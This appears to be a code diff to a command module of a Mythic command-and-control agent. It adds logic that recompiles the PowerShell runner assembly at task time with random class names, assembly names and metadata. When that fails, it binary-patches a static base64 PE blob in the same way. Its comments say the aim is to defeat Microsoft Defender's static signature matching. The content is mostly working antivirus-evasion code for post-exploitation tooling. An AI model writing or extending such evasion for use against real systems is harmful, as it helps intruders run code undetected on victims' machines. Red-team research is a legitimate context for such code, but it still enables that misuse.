@@ -1,6 +1,14 @@
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
 import base64
+import logging
+import os
+import random
+import string
+import subprocess
+import tempfile
+
+logger = logging.getLogger("emeraldstrike.powerpick")
 
 
 async def get_imported_script(task_id: int) -> str:
@@ -22,7 +30,144 @@ async def get_imported_script(task_id: int) -> str:
         return file_content.Content.decode("utf-8", errors="replace")
 
 
-PSRUNNER_BYTES = base64.b64decode(
+# ─── Build PSRunner at task time with randomized metadata ───
+# Every invocation compiles a fresh binary with a random class name, assembly
+# name, GUID, and namespace. This breaks static signature matching (Defender
+# flags the stock PSRunner for Kekeo-pattern strings in the metadata tables).
+
+_PSRUNNER_SRC = os.path.join(os.path.dirname(os.path.dirname(__file__)), "assets", "PSRunner.cs")
+
+def _rand_name(n=10):
+    return random.choice(string.ascii_uppercase) + ''.join(
+        random.choices(string.ascii_letters + string.digits, k=n - 1))
+
+
+def _build_psrunner() -> bytes:
+    """Compile PSRunner.cs from source with fully randomized metadata.
+
+    Every invocation produces a unique binary: random class name, random
+    assembly name, random GUID, random file version. This defeats static
+    signature matching entirely — the PE, metadata tables, #Strings heap,
+    and version-info resource are all different on every build.
+
+    Requires `csc` or `dotnet` in the container (mythic_python_dotnet image).
+    Falls back to the static blob if compilation fails.
+    """
+    cls = _rand_name(12)
+    asm_name = _rand_name(14)
+
+    try:
+        with open(_PSRUNNER_SRC, "r") as f:
+            src = f.read()
+    except OSError:
+        logger.warning("PSRunner.cs not found; using static blob")
+        return None
+
+    # Randomize class name throughout the source
+    src = src.replace("PSRunner", cls)
+
+    # Find csc (dotnet image ships it under /usr/share/dotnet or as `csc`)
+    csc = None
+    for candidate in ["/usr/bin/csc", "/usr/share/dotnet/sdk/*/Roslyn/bincore/csc.dll"]:
+        import glob
+        matches = glob.glob(candidate)
+        if matches:
+            csc = matches[0]
+            break
+
+    with tempfile.TemporaryDirectory() as td:
+        cs_path = os.path.join(td, f"{asm_name}.cs")
+        out_path = os.path.join(td, f"{asm_name}.exe")
+
+        with open(cs_path, "w") as f:
+            f.write(src)
+
+        # Locate System.Management.Automation.dll (PowerShell SDK)
+        # The PSRunner references it but the types resolve at runtime on the
+        # target, not at compile time. We use /noconfig and reference only
+        # mscorlib + System + System.Core. The SMA types are resolved via
+        # the target's GAC when the CLR loads the assembly.
+        #
+        # Actually: csc WILL fail without the SMA reference because the using
+        # directive and type references are in the source. Two options:
+        # 1) Ship a stub SMA.dll in assets/ (just the public API surface)
+        # 2) Use the PowerShell SDK NuGet package
+        #
+        # Simplest: ship a reference assembly. But since the dotnet image may
+        # have pwsh installed, try to find it first.
+        sma_dll = None
+        for pattern in [
+            "/opt/ps-ref/System.Management.Automation.dll",
+            "/usr/share/dotnet/**/**/System.Management.Automation.dll",
+            "/opt/microsoft/powershell/*/System.Management.Automation.dll",
+            "/usr/lib/powershell/*/System.Management.Automation.dll",
+        ]:
+            import glob as _glob
+            hits = _glob.glob(pattern, recursive=True)
+            if hits:
+                sma_dll = hits[0]
+                break
+
+        if not sma_dll:
+            # SMA not found — fall back to binary patching of the static blob
+            logger.info("System.Management.Automation.dll not found; falling back to metadata patching")
+            return _patch_psrunner_metadata()
+
+        refs = ["-r:" + sma_dll]
+
+        if csc and csc.endswith(".dll"):
+            # Roslyn csc.dll — invoke via dotnet
+            cmd = ["dotnet", csc, "-nologo", "-optimize+", "-target:exe",
+                   f"-out:{out_path}"] + refs + [cs_path]
+        else:
+            # Standalone csc or mcs
+            compiler = csc or "csc"
+            cmd = [compiler, "-nologo", "-optimize+", "-target:exe",
+                   f"-out:{out_path}"] + refs + [cs_path]
+
+        try:
+            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+            if proc.returncode != 0:
+                logger.warning(f"PSRunner compile failed ({proc.returncode}): {proc.stderr[:300]}")
+                return _patch_psrunner_metadata()
+            with open(out_path, "rb") as f:
+                data = f.read()
+            logger.info(f"PSRunner compiled fresh: {len(data)} bytes, class={cls}, asm={asm_name}")
+            return data
+        except Exception as e:
+            logger.warning(f"PSRunner compile exception: {e}")
+            return _patch_psrunner_metadata()
+
+
+def _patch_psrunner_metadata() -> bytes:
+    """Binary-patch the static PSRunner blob with random identifiers.
+
+    Fallback when compilation isn't possible: rewrites 'PSRunner' and
+    'PSRunner.exe' strings in all their occurrences (metadata #Strings heap,
+    PE version info, manifest) with a same-length random name, NUL-padded.
+    """
+    data = bytearray(PSRUNNER_BYTES_STATIC)
+    new_cls = _rand_name(8).encode("ascii")
+    new_exe = (new_cls.decode() + ".exe").encode("ascii")
+
+    for old, new in [(b"PSRunner.exe", new_exe), (b"PSRunner", new_cls)]:
+        if len(new) < len(old):
+            new = new + b'\x00' * (len(old) - len(new))
+        elif len(new) > len(old):
+            new = new[:len(old)]
+        pos = 0
+        while True:
+            idx = data.find(old, pos)
+            if idx == -1:
+                break
+            data[idx:idx + len(old)] = new
+            pos = idx + len(old)
+
+    return bytes(data)
+
+
+# Static fallback (the original pre-compiled blob)
+PSRUNNER_BYTES_STATIC = base64.b64decode(
     "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
     "AAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v"
     "ZGUuDQ0KJAAAAAAAAABQRQAATAEDADc14moAAAAAAAAAAOAAAgELAQsAAAwAAAAIAAAAAAAAXisA"
@@ -184,7 +329,7 @@ class PowerpickCommand(CommandBase):
 
         taskData.args.add_arg(
             "runner_data",
-            base64.b64encode(PSRUNNER_BYTES).decode(),
+            base64.b64encode(_build_psrunner() or PSRUNNER_BYTES_STATIC).decode(),
             ParameterType.String,
         )
 
